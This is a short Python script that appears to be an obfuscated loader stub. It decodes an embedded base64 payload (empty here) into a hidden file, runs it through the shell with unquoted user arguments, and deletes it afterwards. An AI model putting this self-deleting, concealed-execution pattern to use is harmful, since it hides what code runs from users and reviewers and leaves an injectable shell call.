import sys
import base64
import os
import time

nmjkl = '.ninjapy'
hgfds = ''
try:
    with open(nmjkl, 'wb') as qwsaz:
        qwsaz.write(base64.b64decode(hgfds))
    os.system('python3 ' + nmjkl + ' ' + ' '.join(sys.argv[1:]))
except Exception as plmok:
    print(f"Dış katman hatası: {plmok}")
finally:
    time.sleep(1)
    if os.path.exists(nmjkl):
        os.remove(nmjkl)
